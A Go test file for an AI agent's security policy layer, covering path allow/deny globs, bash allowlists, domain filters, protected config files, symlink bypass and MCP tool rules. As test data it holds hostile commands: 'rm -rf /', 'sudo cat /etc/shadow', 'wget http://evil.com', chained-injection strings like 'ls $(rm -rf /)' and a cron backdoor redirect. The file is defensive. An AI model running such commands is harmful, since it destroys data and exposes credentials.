// Package policy provides security policy loading and enforcement.
package policy

import (
	"os"
	"path/filepath"
	"testing"
)

// R6.1.1: Load policy.toml from workflow directory
func TestPolicy_LoadFromFile(t *testing.T) {
	tmpDir := t.TempDir()
	policyPath := filepath.Join(tmpDir, "policy.toml")

	content := `
default_deny = true

[read]
enabled = true
allow = ["$WORKSPACE/**"]
deny = ["~/.ssh/*"]
`
	os.WriteFile(policyPath, []byte(content), 0644)

	pol, err := LoadFile(policyPath)
	if err != nil {
		t.Fatalf("load error: %v", err)
	}

	if !pol.DefaultDeny {
		t.Error("expected default_deny = true")
	}

	readPolicy := pol.GetToolPolicy("read")
	if readPolicy == nil {
		t.Fatal("expected read policy")
	}
	if !readPolicy.Enabled {
		t.Error("expected read.enabled = true")
	}
}

// R6.1.3: Apply defaults for missing tool sections
func TestPolicy_Defaults(t *testing.T) {
	pol := New()

	// All tools should have default policy
	readPolicy := pol.GetToolPolicy("read")
	if readPolicy == nil {
		t.Fatal("expected default read policy")
	}
}

// R6.2.1: Check tool enabled flag before execution
func TestPolicy_ToolEnabled(t *testing.T) {
	pol := New()
	pol.Tools["bash"] = &ToolPolicy{Enabled: false}

	if pol.IsToolEnabled("bash") {
		t.Error("bash should be disabled")
	}

	if !pol.IsToolEnabled("read") {
		t.Error("read should be enabled by default")
	}
}

// R6.2.2: Check global default_deny setting
func TestPolicy_DefaultDeny(t *testing.T) {
	pol := New()
	pol.DefaultDeny = true

	// With default_deny, a path with no matching allow should be blocked
	allowed, reason := pol.CheckPath("read", "/etc/passwd")
	if allowed {
		t.Error("should deny /etc/passwd with default_deny")
	}
	if reason == "" {
		t.Error("should have denial reason")
	}
}

// R6.2.3: Evaluate deny patterns (deny wins on match)
func TestPolicy_DenyPatterns(t *testing.T) {
	pol := New()
	pol.Tools["read"] = &ToolPolicy{
		Enabled: true,
		Allow:   []string{"**"},
		Deny:    []string{"~/.ssh/*"},
	}
	pol.HomeDir = "/home/user"

	allowed, _ := pol.CheckPath("read", "/home/user/.ssh/id_rsa")
	if allowed {
		t.Error("should deny ~/.ssh/* paths")
	}
}

// R6.2.4: Evaluate allow patterns
func TestPolicy_AllowPatterns(t *testing.T) {
	pol := New()
	pol.Workspace = "/workspace"
	pol.Tools["read"] = &ToolPolicy{
		Enabled: true,
		Allow:   []string{"$WORKSPACE/**"},
	}

	allowed, _ := pol.CheckPath("read", "/workspace/src/main.go")
	if !allowed {
		t.Error("should allow $WORKSPACE/** paths")
	}
}

// R6.3.1: Expand $WORKSPACE variable to workspace path
func TestPolicy_WorkspaceExpansion(t *testing.T) {
	pol := New()
	pol.Workspace = "/my/workspace"
	pol.Tools["write"] = &ToolPolicy{
		Enabled: true,
		Allow:   []string{"$WORKSPACE/**"},
	}

	allowed, _ := pol.CheckPath("write", "/my/workspace/file.txt")
	if !allowed {
		t.Error("should expand $WORKSPACE and allow")
	}

	allowed, _ = pol.CheckPath("write", "/other/path/file.txt")
	if allowed {
		t.Error("should deny paths outside $WORKSPACE")
	}
}

// R6.3.2: Expand ~ to user home directory
func TestPolicy_HomeExpansion(t *testing.T) {
	pol := New()
	pol.HomeDir = "/home/testuser"
	pol.Tools["read"] = &ToolPolicy{
		Enabled: true,
		Allow:   []string{"~/documents/**"},
	}

	allowed, _ := pol.CheckPath("read", "/home/testuser/documents/file.txt")
	if !allowed {
		t.Error("should expand ~ and allow")
	}
}

// R6.3.3: Match paths against glob patterns
func TestPolicy_GlobPatterns(t *testing.T) {
	pol := New()
	pol.Workspace = "/workspace"
	pol.Tools["read"] = &ToolPolicy{
		Enabled: true,
		Allow:   []string{"$WORKSPACE/*.go"},
	}

	allowed, _ := pol.CheckPath("read", "/workspace/main.go")
	if !allowed {
		t.Error("should match *.go pattern")
	}

	allowed, _ = pol.CheckPath("read", "/workspace/main.txt")
	if allowed {
		t.Error("should not match .txt files")
	}
}

// R6.3.4: Support * (single segment) and ** (recursive)
func TestPolicy_RecursiveGlob(t *testing.T) {
	pol := New()
	pol.Workspace = "/workspace"
	pol.Tools["read"] = &ToolPolicy{
		Enabled: true,
		Allow:   []string{"$WORKSPACE/**"},
	}

	// ** should match any depth
	allowed, _ := pol.CheckPath("read", "/workspace/a/b/c/d/file.go")
	if !allowed {
		t.Error("** should match any depth")
	}

	// Single * should NOT match across directories
	pol.Tools["read"].Allow = []string{"$WORKSPACE/*"}
	allowed, _ = pol.CheckPath("read", "/workspace/a/b/file.go")
	if allowed {
		t.Error("* should not match across directories")
	}
}

// R6.4.1: Check command against denylist first
func TestPolicy_BashDenylist(t *testing.T) {
	pol := New()
	pol.Tools["bash"] = &ToolPolicy{
		Enabled:   true,
		Allowlist: []string{"ls *", "cat *"},
		Denylist:  []string{"rm -rf *", "sudo *"},
	}

	allowed, _ := pol.CheckCommand("bash", "rm -rf /")
	if allowed {
		t.Error("should deny rm -rf")
	}

	allowed, _ = pol.CheckCommand("bash", "sudo cat /etc/shadow")
	if allowed {
		t.Error("should deny sudo commands")
	}
}

// R6.4.2: Check command against allowlist
func TestPolicy_BashAllowlist(t *testing.T) {
	pol := New()
	pol.Tools["bash"] = &ToolPolicy{
		Enabled:   true,
		Allowlist: []string{"ls *", "cat *", "go test *"},
	}

	allowed, _ := pol.CheckCommand("bash", "ls -la")
	if !allowed {
		t.Error("should allow ls commands")
	}

	allowed, _ = pol.CheckCommand("bash", "go test ./...")
	if !allowed {
		t.Error("should allow go test")
	}
}

// R6.4.3: Block if not in allowlist
func TestPolicy_BashNotInAllowlist(t *testing.T) {
	pol := New()
	pol.Tools["bash"] = &ToolPolicy{
		Enabled:   true,
		Allowlist: []string{"ls *"},
	}

	allowed, _ := pol.CheckCommand("bash", "wget http://evil.com")
	if allowed {
		t.Error("should block commands not in allowlist")
	}
}

// R6.4.4: Block command chaining attacks (shell metacharacters)
func TestPolicy_BashCommandChaining(t *testing.T) {
	pol := New()
	pol.Tools["bash"] = &ToolPolicy{
		Enabled:   true,
		Allowlist: []string{"ls *"},
	}

	// These should all be blocked despite starting with "ls"
	attacks := []string{
		"ls && rm -rf /",
		"ls || rm -rf /",
		"ls; rm -rf /",
		"ls | cat /etc/passwd",
		"ls `rm -rf /`",
		"ls $(rm -rf /)",
		"ls > /etc/cron.d/backdoor",
		"ls\nrm -rf /",
	}

	for _, cmd := range attacks {
		allowed, _ := pol.CheckCommand("bash", cmd)
		if allowed {
			t.Errorf("should block command chaining attack: %q", cmd)
		}
	}
}

// R6.5.1: Check domain against allow_domains list
func TestPolicy_WebDomains(t *testing.T) {
	pol := New()
	pol.Tools["web_fetch"] = &ToolPolicy{
		Enabled:      true,
		AllowDomains: []string{"github.com", "*.google.com"},
	}

	allowed, _ := pol.CheckDomain("web_fetch", "github.com")
	if !allowed {
		t.Error("should allow github.com")
	}

	allowed, _ = pol.CheckDomain("web_fetch", "docs.google.com")
	if !allowed {
		t.Error("should allow *.google.com")
	}

	allowed, _ = pol.CheckDomain("web_fetch", "evil.com")
	if allowed {
		t.Error("should block evil.com")
	}
}

// R6.5.2: Enforce rate_limit
func TestPolicy_RateLimit(t *testing.T) {
	pol := New()
	pol.Tools["web_fetch"] = &ToolPolicy{
		Enabled:   true,
		RateLimit: 10,
	}

	tp := pol.GetToolPolicy("web_fetch")
	if tp.RateLimit != 10 {
		t.Errorf("expected rate limit 10, got %d", tp.RateLimit)
	}
}

// R6.6: Protected config files cannot be modified
func TestPolicy_ProtectedFiles(t *testing.T) {
	pol := New()
	pol.ConfigDir = "/workspace"
	pol.HomeDir = "/home/user"

	tests := []struct {
		path      string
		protected bool
	}{
		{"agent.toml", true},
		{"policy.toml", true},
		{"credentials.toml", true},
		{"/workspace/agent.toml", true},
		{"/workspace/policy.toml", true},
		{"/home/user/.config/grid/credentials.toml", true},
		{"README.md", false},
		{"/workspace/src/main.go", false},
		{"/workspace/config.toml", false}, // not a protected name
	}

	for _, tt := range tests {
		result := pol.IsProtectedFile(tt.path)
		if result != tt.protected {
			t.Errorf("IsProtectedFile(%q) = %v, want %v", tt.path, result, tt.protected)
		}
	}
}

// R6.6.1: Write tool blocks protected files
func TestPolicy_WriteBlocksProtectedFiles(t *testing.T) {
	pol := New()
	pol.ConfigDir = "/workspace"
	pol.Tools["write"] = &ToolPolicy{
		Enabled: true,
		Allow:   []string{"**"}, // Allow everything normally
	}

	allowed, reason := pol.CheckPath("write", "/workspace/agent.toml")
	if allowed {
		t.Error("should block write to agent.toml")
	}
	if reason == "" {
		t.Error("should have denial reason for protected file")
	}

	// Normal files should still work
	allowed, _ = pol.CheckPath("write", "/workspace/src/main.go")
	if !allowed {
		t.Error("should allow write to normal files")
	}
}

// R6.6.2: Edit tool blocks protected files
func TestPolicy_EditBlocksProtectedFiles(t *testing.T) {
	pol := New()
	pol.ConfigDir = "/workspace"
	pol.Tools["edit"] = &ToolPolicy{
		Enabled: true,
		Allow:   []string{"**"},
	}

	allowed, _ := pol.CheckPath("edit", "policy.toml")
	if allowed {
		t.Error("should block edit to policy.toml")
	}

	allowed, _ = pol.CheckPath("edit", "credentials.toml")
	if allowed {
		t.Error("should block edit to credentials.toml")
	}
}

// R6.6.3: Symlink bypass protection
func TestPolicy_SymlinkBypass(t *testing.T) {
	tmpDir := t.TempDir()
	pol := New()
	pol.ConfigDir = tmpDir
	pol.HomeDir = tmpDir

	// Create a real credentials.toml
	credPath := filepath.Join(tmpDir, "credentials.toml")
	os.WriteFile(credPath, []byte("test"), 0600)

	// Create a symlink to it
	linkPath := filepath.Join(tmpDir, "innocent.txt")
	os.Symlink(credPath, linkPath)

	// The symlink should be detected as protected
	if !pol.IsProtectedFile(linkPath) {
		t.Error("symlink to credentials.toml should be protected")
	}

	// Direct access should also be protected
	if !pol.IsProtectedFile(credPath) {
		t.Error("direct credentials.toml should be protected")
	}
}

// R6.7: MCP tool policy
func TestPolicy_MCPToolNotConfigured(t *testing.T) {
	pol := New()
	// MCP is nil - should allow but warn

	allowed, _, warning := pol.CheckMCPTool("filesystem", "read_file")
	if !allowed {
		t.Error("should allow MCP tool when policy not configured")
	}
	if warning == "" {
		t.Error("should warn when MCP policy not configured")
	}
}

func TestPolicy_MCPToolDefaultDenyFalse(t *testing.T) {
	pol := New()
	pol.MCP = &MCPPolicy{DefaultDeny: false}

	allowed, _, warning := pol.CheckMCPTool("filesystem", "read_file")
	if !allowed {
		t.Error("should allow when default_deny is false")
	}
	if warning != "" {
		t.Error("should not warn when policy is configured")
	}
}

func TestPolicy_MCPToolDefaultDenyTrue(t *testing.T) {
	pol := New()
	pol.MCP = &MCPPolicy{
		DefaultDeny:  true,
		AllowedTools: []string{"filesystem:read_file", "memory:*"},
	}

	// Explicitly allowed tool
	allowed, _, _ := pol.CheckMCPTool("filesystem", "read_file")
	if !allowed {
		t.Error("should allow filesystem:read_file")
	}

	// Wildcard pattern
	allowed, _, _ = pol.CheckMCPTool("memory", "store")
	if !allowed {
		t.Error("should allow memory:* pattern")
	}

	// Not in allowlist
	allowed, reason, _ := pol.CheckMCPTool("filesystem", "write_file")
	if allowed {
		t.Error("should deny filesystem:write_file")
	}
	if reason == "" {
		t.Error("should have denial reason")
	}
}

func TestPolicy_MCPToolParsing(t *testing.T) {
	content := `
default_deny = true

[mcp]
default_deny = true
allowed_tools = ["filesystem:read_file", "memory:*"]
`
	pol, err := Parse(content)
	if err != nil {
		t.Fatalf("parse error: %v", err)
	}

	if pol.MCP == nil {
		t.Fatal("expected MCP policy to be parsed")
	}
	if !pol.MCP.DefaultDeny {
		t.Error("expected MCP default_deny = true")
	}
	if len(pol.MCP.AllowedTools) != 2 {
		t.Errorf("expected 2 allowed tools, got %d", len(pol.MCP.AllowedTools))
	}
}
